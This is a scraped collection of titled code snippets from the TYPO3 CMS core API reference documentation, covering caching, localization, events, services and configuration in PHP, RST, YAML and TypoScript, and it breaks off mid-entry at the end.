https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DataHandler/Introduction/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nsys_log\n```\n\n----------------------------------------\n\nTITLE: Including ReStructuredText File in TYPO3 Documentation\nDESCRIPTION: This directive includes a common ReStructuredText file, likely containing shared content or settings for the documentation project.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/Architecture/Folders.rst#2025-04-16_snippet_0\n\nLANGUAGE: restructuredtext\nCODE:\n```\n..  include:: /Includes.rst.txt\n```\n\n----------------------------------------\n\nTITLE: Building a Cache Identifier in PHP\nDESCRIPTION: Demonstrates how to create a cache identifier by combining page ID and user login status, then hashing with sha1 to create a unique string. This is a common pattern for cache identification in TYPO3 extensions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CachingFramework/Architecture/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$identifier = sha1((string)$this->getPageUid() . (string)$this->isUserLoggedIn());\n```\n\n----------------------------------------\n\nTITLE: Custom German XLIFF Translation Override\nDESCRIPTION: XML structure for a custom German translation that overrides the default translation file in TYPO3. This example modifies the 'module.web_info.menu.1' label.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/ManagingTranslations.rst#2025-04-16_snippet_5\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\" ?>\n<xliff version=\"1.0\">\n\t<file source-language=\"en\" target-language=\"de\" datatype=\"plaintext\" original=\"messages\" date=\"2020-03-17T18:20:51Z\">\n\t\t<header/>\n\t\t<body>\n\t\t\t<trans-unit id=\"module.web_info.menu.1\" xml:space=\"preserve\">\n\t\t\t\t<source>Basic Settings</source>\n\t\t\t\t<target>My custom german translation</target>\n\t\t\t</trans-unit>\n\t\t</body>\n\t</file>\n</xliff>\n```\n\n----------------------------------------\n\nTITLE: Creating Edit Record Link in PHP Controller\nDESCRIPTION: Demonstrates how to create an edit record link using the UriBuilder in a PHP controller with additional options.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/UriBuilder.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\npublic function moduleAction(): ResponseInterface\n{\n    $uriBuilder = GeneralUtility::makeInstance(UriBuilder::class);\n    $url = $uriBuilder->buildUriFromRoute(\n        'record_edit',\n        [\n            'edit' => [\n                'pages' => [\n                    $this->pageId => 'edit',\n                ],\n            ],\n            'columnsOnly' => 'doktype',\n            'returnUrl' => GeneralUtility::getIndpEnv('REQUEST_URI'),\n        ]\n    );\n    // ...\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Specific Form Protection Types\nDESCRIPTION: Demonstrates how to create form protection instances specifically for backend or frontend use instead of using auto-detection.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FormProtection/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n// For backend\n$formProtection = $this->formProtectionFactory->createFromType('backend');\n\n// For frontend\n$formProtection = $this->formProtectionFactory->createFromType('frontend');\n```\n\n----------------------------------------\n\nTITLE: General Syntax for Overriding Service Registration in TYPO3 CMS\nDESCRIPTION: This code snippet shows the general syntax for overriding service registration options in TYPO3 CMS. It allows modification of various options for a specific service type and key.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/Configuration/RegistrationChanges.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['T3_SERVICES'][service type][service key][option key] = value;\n```\n\n----------------------------------------\n\nTITLE: Git Clone and Composer Install Command\nDESCRIPTION: Shell commands to clone the Enetcache repository and initialize dependencies\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/Tutorial/Enetcache.rst#2025-04-16_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngit clone git@github.com:lolli42/enetcache.git\ncd enetcache\ncomposer install\n```\n\n----------------------------------------\n\nTITLE: Defining Page Title and Description in reStructuredText\nDESCRIPTION: This snippet sets the main title for the documentation page and provides a brief introduction to the content.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/UsingServices/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: reStructuredText\nCODE:\n```\n==============\nUsing Services\n==============\n\nThis chapter describes the different ways in which services\ncan be used. It also explains the most important notion about\nservices: precedence.\n```\n\n----------------------------------------\n\nTITLE: RST Note Directive\nDESCRIPTION: Adds a note about file write protection limitations\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/UserManagement/BackendLanguages.rst#2025-04-16_snippet_4\n\nLANGUAGE: rst\nCODE:\n```\n..  note::\n    If the :file:`config/system/settings.php` file is write-protected, all\n    buttons are disabled and an info box is rendered.\n```\n\n----------------------------------------\n\nTITLE: Simple Array Declaration with Trailing Comma\nDESCRIPTION: Shows a minimal array declaration with a single element and optional trailing comma\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_22\n\nLANGUAGE: php\nCODE:\n```\n$a = [\n    0 => 'b',\n];\n```\n\n----------------------------------------\n\nTITLE: Example of Incorrect Extension Key Transformation\nDESCRIPTION: Shows an incorrect extension key format that should be avoided.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Namespaces/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: none\nCODE:\n```\nweird-name_examples\n```\n\n----------------------------------------\n\nTITLE: Poor Log Message Examples in TYPO3\nDESCRIPTION: Examples of inadequate log messages that lack proper context and consistency.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Logger/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: text\nCODE:\n```\n\"Database not reached\"\n\"Could not establish connection to memcache\"\n```\n\n----------------------------------------\n\nTITLE: Directory Structure for Composer Autoloader Files\nDESCRIPTION: Shows the typical directory structure for Composer's autoloader files in the vendor/composer directory. These files are used by TYPO3 when running in Composer mode.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Autoloading/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ tree vendor/composer\n.\n├── ClassLoader.php\n├── LICENSE\n├── autoload_classmap.php\n├── autoload_files.php\n├── autoload_namespaces.php\n├── autoload_psr4.php\n├── autoload_real.php\n├── autoload_static.php\n├── include_paths.php\n└── installed.json\n```\n\n----------------------------------------\n\nTITLE: Image inclusion using figure directive in documentation\nDESCRIPTION: This snippet demonstrates how to include an image in TYPO3 documentation using the `figure` directive.  It specifies the image path, a CSS class for styling, and a caption describing the image content. The image illustrates the DB mounts for the \"Editors\" group.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/AccessControl/DbMounts.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: Text\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/AccessControl/DbMounts.png\n   :class: with-shadow\n\n   The DB mounts for group \"Editors\"\n```\n\n----------------------------------------\n\nTITLE: Install Tool Password Configuration\nDESCRIPTION: PHP configuration for setting the Install Tool password hash in the TYPO3 system settings file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Troubleshooting/TYPO3.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n'BE' => [\n   'installToolPassword' => '$argon2i$v=xyz',\n],\n```\n\n----------------------------------------\n\nTITLE: Accessing Properties from Extbase FileReference Objects\nDESCRIPTION: Demonstrates how to access properties from an Extbase FileReference domain model by first accessing the originalResource property.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/UsingFal/Frontend.rst#2025-04-16_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n{fileReference.originalResource.title}\n{fileReference.originalResource.description}\n{fileReference.originalResource.publicUrl}\n```\n\n----------------------------------------\n\nTITLE: Adjusting TCA for Core-based Plugin Migration in TYPO3\nDESCRIPTION: Updates the TCA configuration for a Core-based plugin to use CType instead of list_type.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/MigrationListType.rst#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\nExtensionManagementUtility::addPlugin(\n    [\n        'LLL:EXT:my_extension/Resources/Private/Language/locallang_be.xlf:tt_content.pi1_plus_wiz',\n-        'my_extension_pi1',\n-        'EXT:my_extension/Resources/Public/Icons/Extension.svg'\n+        'my_extension_pi1',\n+        'EXT:my_extension/Resources/Public/Icons/Extension.svg',\n+        'content-plugin'\n    ],\n-    'list_type',\n+    'CType',\n    'my_extension_pi1'\n);\n```\n\n----------------------------------------\n\nTITLE: Defining ReStructuredText Index Entry for Processed Files\nDESCRIPTION: This directive adds an index entry for 'File abstraction layer; Processed files' in the documentation, improving searchability for this specific topic.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/Architecture/Folders.rst#2025-04-16_snippet_3\n\nLANGUAGE: restructuredtext\nCODE:\n```\n..  index:: File abstraction layer; Processed files\n```\n\n----------------------------------------\n\nTITLE: TypoScript Constant Lookup\nDESCRIPTION: This snippet illustrates how to use TypoScript to lookup the value of a constant and use it in a string. If the constant cannot be resolved, the string \"{$myConstant}\" will be used as a fallback. This enables dynamic configuration based on defined constants.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/TypoScriptSyntax/OperatorMultiLine.rst.txt#2025-04-16_snippet_2\n\nLANGUAGE: typoscript\nCODE:\n```\nmyIdentifier= TEXT\nmyIdentifier.value (\n   This looks up the value for constant {$myConstant}\n   and falls back to the string \\\"{$myConstant}\\\" if it can\n   not be resolved.\n)\n```\n\n----------------------------------------\n\nTITLE: Using Text Validator in PHP\nDESCRIPTION: Example of applying the Text validator to ensure a comment field contains valid text without HTML/XML tags.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Validation/Validators/Index.rst#2025-04-16_snippet_13\n\nLANGUAGE: php\nCODE:\n```\n#[Validate(['validator' => 'Text'])]\nprotected string $comment;\n```\n\n----------------------------------------\n\nTITLE: Accessing Frontend Page Routing Information in TYPO3\nDESCRIPTION: Example of retrieving page routing information from a PSR-7 request object in TYPO3's frontend context. Shows how to access the PageArguments object and get the current page ID.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/RequestAttributes/Routing.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n/** @var \\Psr\\Http\\Message\\ServerRequestInterface $request */\n$pageArguments = $request->getAttribute('routing');\n$pageId = $pageArguments->getPageId();\n```\n\n----------------------------------------\n\nTITLE: Defining AfterFlexFormDataStructureParsedEvent Class in PHP\nDESCRIPTION: This snippet defines the AfterFlexFormDataStructureParsedEvent class with methods for retrieving and modifying flex form data structures. It includes methods for getting the identifier, retrieving the current data structure, and setting a new data structure.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/AfterFlexFormDataStructureParsedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Core\\Configuration\\Event;\n\nclass AfterFlexFormDataStructureParsedEvent\n{\n    public function getIdentifier(): array\n    {\n        // Implementation not provided\n    }\n\n    public function getDataStructure(): array\n    {\n        // Implementation not provided\n    }\n\n    public function setDataStructure(array $dataStructure): void\n    {\n        // Implementation not provided\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Referencing TYPO3 Error Handler Class\nDESCRIPTION: The main error handler class path in TYPO3 CMS that handles PHP errors and provides various error handling capabilities.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ErrorAndExceptionHandling/ErrorHandler/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Error\\ErrorHandler\n```\n\n----------------------------------------\n\nTITLE: Implementing BeforeTypoLinkEncodedEvent Listener in PHP\nDESCRIPTION: Example of an event listener implementation for the BeforeTypoLinkEncodedEvent. This listener manipulates TypoLink parts by adding a custom attribute to the parameter array.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/LinkHandling/BeforeTypoLinkEncodedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\LinkHandling\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Attribute\\AsEventListener;\nuse TYPO3\\CMS\\Core\\LinkHandling\\Event\\BeforeTypoLinkEncodedEvent;\n\nfinal readonly class MyEventListener\n{\n    #[AsEventListener(\n        identifier: 'my-extension/link-handling/add-custom-attribute'\n    )]\n    public function __invoke(BeforeTypoLinkEncodedEvent $event): void\n    {\n        // Add a custom attribute to the parameter array\n        $linkParts = $event->getLinkParts();\n        $linkParts['additionalParams'] = ($linkParts['additionalParams'] ?? '') . ' data-custom=\"1\"';\n        $event->setLinkParts($linkParts);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Identifiers in TypoScript\nDESCRIPTION: This snippet demonstrates how to define a sub-identifier within a TypoScript setup file. The purpose is to set configurations specific to an extension. 'myIdentifier.mySubIdentifier' is assigned a value, 'myValue', which can be retrieved programmatically within the TYPO3 CMS environment for further customization or logic execution. This setup is essential for extending TYPO3 functionalities through custom TypoScript configurations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/TypoScriptSyntax/Identifiers1.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nmyIdentifier.mySubIdentifier = myValue\n```\n\n----------------------------------------\n\nTITLE: Including TYPO3 Documentation Templates in RST\nDESCRIPTION: Imports common TYPO3 documentation templates and styles for reStructuredText files. This is a standard include directive used in TYPO3 documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/RequestAttributes/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. include:: /Includes.rst.txt\n```\n\n----------------------------------------\n\nTITLE: Service Configuration for TYPO3 Extension\nDESCRIPTION: YAML configuration for registering the BackendControllerHook as a public service in TYPO3's dependency injection container, with default service settings.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BroadcastChannels.rst#2025-04-16_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nservices:\n  _defaults:\n    autowire: true\n    autoconfigure: true\n    public: false\n\n  MyVendor\\MyExtension\\Hooks\\BackendControllerHook:\n    public: true\n```\n\n----------------------------------------\n\nTITLE: Disable CSP Reporting Configuration\nDESCRIPTION: Configuration example showing how to disable Content Security Policy reporting in TYPO3 frontend.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/FE.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n// Disables Content Security Policy reporting\n$GLOBALS['TYPO3_CONF_VARS']['BE']['contentSecurityPolicyReportingUrl'] = '0';\n```\n\n----------------------------------------\n\nTITLE: Accessing TYPO3 General Information with Typo3Information Class in PHP\nDESCRIPTION: This snippet demonstrates the methods available in the Typo3Information class for retrieving general TYPO3 information, copyright details, and meta tags. It includes methods for getting copyright years, generator tag content, inline header comments, and copyright notices.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Typo3Information/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nTYPO3\\CMS\\Core\\Information\\Typo3Information::getCopyrightYear()\nTYPO3\\CMS\\Core\\Information\\Typo3Information::getHtmlGeneratorTagContent()\nTYPO3\\CMS\\Core\\Information\\Typo3Information::getInlineHeaderComment()\nTYPO3\\CMS\\Core\\Information\\Typo3Information::getCopyrightNotice()\n```\n\n----------------------------------------\n\nTITLE: RST Section Header\nDESCRIPTION: RST markup for the main section header of the RequireJS dependency handling documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/RequireJS/Dependency/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: rst\nCODE:\n```\n=============================\nRequireJS dependency handling\n=============================\n```\n\n----------------------------------------\n\nTITLE: Including ModifyButtonBarEvent Reference\nDESCRIPTION: RST directive to include core documentation and index the ModifyButtonBarEvent topic\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/ModifyButtonBarEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index:: Events; ModifyButtonBarEvent\n..  _ModifyButtonBarEvent:\n```\n\n----------------------------------------\n\nTITLE: Creating RST Index Page for TYPO3 Backend Events\nDESCRIPTION: ReStructuredText markup that creates an index page for TYPO3 backend events documentation. It includes necessary imports, sets up indexing, and creates a table of contents for child documents.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index:: pair: Events; Backend\n..  _eventlist-backend:\n\n=======\nBackend\n=======\n\nThe following list contains :ref:`PSR-14 events <EventDispatcher>`\nin EXT:backend.\n\n**Contents:**\n\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: RST Section Definition\nDESCRIPTION: RST markup defining the Introduction section with proper heading formatting\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Introduction/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: RST\nCODE:\n```\n..  _Database_Introduction:\n\n============\nIntroduction\n============\n```\n\n----------------------------------------\n\nTITLE: Generating Table of Contents in TYPO3 Documentation\nDESCRIPTION: This RST directive generates a table of contents for the current section in the TYPO3 documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/UserManagement/BackendUsers/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: rst\nCODE:\n```\n..  contents::\n```\n\n----------------------------------------\n\nTITLE: Adding Site Settings in YAML for TYPO3 CMS\nDESCRIPTION: This snippet demonstrates how to add site settings to the settings.yaml file in TYPO3 CMS. It includes examples of configuring a login form PID and a custom category PID.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/SiteSettings.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n# Login\nstyles:\n  content:\n    loginform:\n      pid: 123\n\n# Custom\ncategoryPid: 456\n```\n\n----------------------------------------\n\nTITLE: Cleaning Single Property in TYPO3 ModuleData\nDESCRIPTION: This method cleans a single property based on a list of allowed values. It uses default data as a fallback and returns a boolean indicating if any cleaning was performed.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Entity/ModuleData.rst.txt#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\n..  php:method:: clean(string $propertyName, array $allowedValues)\n        :returns: `bool`\n\n        Cleans a single property by the given allowed list. First fallback\n        is the default data list. If this list does also not contain an\n        allowed value, the first value from the allowed list is taken.\n\n        :param $propertyName: the propertyName\n        :param $allowedValues: the allowedValues\n        :Return description: True if something has been cleaned up\n```\n\n----------------------------------------\n\nTITLE: Setting XSL File for Specific Sitemap Type\nDESCRIPTION: TypoScript configuration for applying a custom XSL file to all sitemaps of a particular type in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/XmlSitemap.rst#2025-04-16_snippet_7\n\nLANGUAGE: typoscript\nCODE:\n```\nplugin.tx_seo.config.<sitemapType>.sitemaps.xslFile = EXT:my_extension/Resources/Public/CSS/mySitemapType.xsl\n```\n\n----------------------------------------\n\nTITLE: TYPO3 XLF Translation Unit Definition\nDESCRIPTION: Example of a translation unit definition in an XLF file showing a parameterized translation string.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/LocalizationApi/_LanguageService.rst.txt#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n<trans-unit id=\\\"downloaded_times\\\">\\n    <source>downloaded %d times from %s locations</source>\\n</trans-unit>\n```\n\n----------------------------------------\n\nTITLE: Defining Nested Options\nDESCRIPTION: Illustrates how to define nested extension configuration options using TypoScript-like syntax. It defines a 'directories' node with 'tmp' and 'cache' sub-options. This results in a multi-dimensional array when the configuration is accessed.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/ExtConfTemplate.rst#2025-04-16_snippet_5\n\nLANGUAGE: typoscript\nCODE:\n```\n\"directories {\\n   # cat=basic/enable; type=string; label=Path to the temporary directory\\n   tmp =\\n   # cat=basic/enable; type=string; label=Path to the cache directory\\n   cache =\\n}\"\n```\n\n----------------------------------------\n\nTITLE: Versioning Preview Overlay in TYPO3 PHP\nDESCRIPTION: This code snippet shows how to use the versionOL() method from the PageRepository class to handle version previews in the frontend. It demonstrates iterating over query results and applying version overlays to each row.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Workspaces/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Domain\\Repository\\PageRepository;\n// use TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\n\n$pageRepository = GeneralUtility::makeInstance(PageRepository);\n$result = $queryBuilder->executeQuery();\nwhile ($row = $result->fetchAssociative()) {\n    $pageRepository->versionOL($table, $row);\n    if (is_array($row)) {\n        // ...\n    }\n    // ...\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Extended JavaScript Modules with Exclusions and Overwrites\nDESCRIPTION: Complex configuration example for JavaScript modules in TYPO3 with recursive-lookup exclusions, third-party library definitions and overwrites.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/ES6/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\nreturn [\n    // other JavaScript module configurations this one depends on\n    'dependencies' => ['core', '@typo3/backend'],\n    // expose extensions' public resources by this name\n    'imports' => [\n        '@vendor/my-extension/' => 'EXT:my_extension/Resources/Public/JavaScript/',\n    ],\n    // allows to exclude specific module paths from recursive lookups\n    'excludeFromImportmap' => [\n        // excludes all paths below the specified path\n        'EXT:my_extension/Resources/Public/JavaScript/LegacyModules/',\n        // excludes exactly the specified path\n        'EXT:my_extension/Resources/Public/JavaScript/Vendor/third-party-component.js',\n    ],\n    // define third-party library definitions\n    'packages' => [\n        'cropper' => [\n            'type' => 'npm',\n            'name' => 'cropperjs',\n            'version' => '^1.5.12',\n            'sources' => [\n                'url' => 'https://cdn.jsdelivr.net/npm/cropperjs@1.5.12/dist/cropper.js',\n                'integrity' => 'sha256-GeJMf0ynHTpvWr/ksHgzG/nxUcz++XyjAHmJkWEqiKA=',\n            ],\n        ],\n    ],\n    // overwrite module imports of others\n    'overrides' => [\n        // override module implementation - but continue using the module\n        '@typo3/backend/module.js' => 'EXT:my_extension/Resources/Public/JavaScript/module-override.js',\n    ],\n    // tags can be used to identify groups of modules\n    'tags' => [\n        'backend.form' => [\n            // tag @vendor/my-extension/form-element to be used in backend.form context\n            '@vendor/my-extension/form-element.js'\n        ],\n    ],\n];\n\n```\n\n----------------------------------------\n\nTITLE: Cache Directory Structure\nDESCRIPTION: Example of TYPO3's cache file structure showing concatenated extension configuration files.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Troubleshooting/TYPO3.rst#2025-04-16_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n-rw-rw----   1 www-data   www-data   61555  2014-03-26 16:28   ext_localconf_8b0519db6112697cceedb50296df89b0ce04ff70.php\n-rw-rw----   1 www-data   www-data   81995  2014-03-26 16:28   ext_tables_c3638687920118a92ab652cbf23a9ca69d4a6469.php\n```\n\n----------------------------------------\n\nTITLE: RST Image Directive for TYPO3 Cache Flush Screenshot\nDESCRIPTION: ReStructuredText directive for displaying a screenshot of the TYPO3 cache flush interface in the Admin Tool, including alt text and styling class.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/AdminTools/ClearAllCache.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/AdminTools/ClearAllCache.png\n   :alt: Flush Caches\n   :class: with-shadow\n\n   The option \"Flush\" in the Admin Tool.\n```\n\n----------------------------------------\n\nTITLE: Using the BeforeHistoryRollbackStartEvent in TYPO3 CMS Backend\nDESCRIPTION: This code snippet illustrates the API of the BeforeHistoryRollbackStartEvent class in TYPO3 CMS, which is triggered before a history record rollback operation begins.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/BeforeHistoryRollbackStartEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class BeforeHistoryRollbackStartEvent\n{\n    public function __construct(\n        private HistoryEntry $historyEntry,\n        private BackendUserAuthentication $user\n    ) {\n    }\n\n    public function getHistoryEntry(): HistoryEntry\n    {\n        return $this->historyEntry;\n    }\n\n    public function getUser(): BackendUserAuthentication\n    {\n        return $this->user;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Database Command for TYPO3 Extension Setup\nDESCRIPTION: Console commands to set up TYPO3 extensions in both Composer-based and Legacy installations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/AddingYourOwnContentElements.rst#2025-04-16_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nvendor/bin/typo3 extension:setup\n```\n\nLANGUAGE: bash\nCODE:\n```\ntypo3/sysext/core/bin/typo3 extension:setup\n```\n\n----------------------------------------\n\nTITLE: Retrieving Normalized Parameters in TYPO3\nDESCRIPTION: Example showing how to access normalized parameters from a request attribute in TYPO3. This code demonstrates getting the request port through the NormalizedParams object.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/RequestAttributes/NormalizedParams.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n/** @var \\TYPO3\\CMS\\Core\\Http\\NormalizedParams $normalizedParams */\n$normalizedParams = $request->getAttribute('normalizedParams');\n$requestPort = $normalizedParams->getRequestPort();\n```\n\n----------------------------------------\n\nTITLE: Registering Custom Transport in TYPO3 Services Configuration\nDESCRIPTION: YAML configuration to register a custom transport for the message bus. This defines the transport service and tags it appropriately for the TYPO3 message system.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/MessageBus/Index.rst#2025-04-16_snippet_8\n\nLANGUAGE: YAML\nCODE:\n```\nservices:\n  messenger.transport.demo:\n    class: 'Symfony\\Component\\Messenger\\Transport\\TransportInterface'\n    factory: ['@Symfony\\Component\\Messenger\\Transport\\TransportFactory', 'createTransport']\n    arguments:\n      - 'doctrine://default?table_name=demo_messages'\n      - []\n      - '@messenger.transport.symfony_serializer'\n    tags:\n      - name: 'message.sender'\n        identifier: 'demo'\n```\n\n----------------------------------------\n\nTITLE: Registering Custom Functions Provider\nDESCRIPTION: Example of registering a custom functions provider class within the main provider.\nSOURCE: 